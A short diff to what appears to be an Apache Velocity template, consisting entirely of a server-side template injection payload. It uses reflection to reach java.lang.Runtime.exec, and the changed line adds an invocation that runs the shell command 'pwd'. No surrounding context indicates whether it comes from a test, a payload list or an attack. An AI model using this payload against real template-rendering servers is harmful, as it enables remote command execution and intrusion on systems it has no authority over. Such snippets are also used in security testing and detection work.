@@ -1,2 +1,2 @@
 #set($e="e")
-$e.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).getMethod('exec', $e.getClass().forName("java.lang.String")).toString()
+$e.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).getMethod('exec', $e.getClass().forName("java.lang.String")).invoke('pwd').toString()
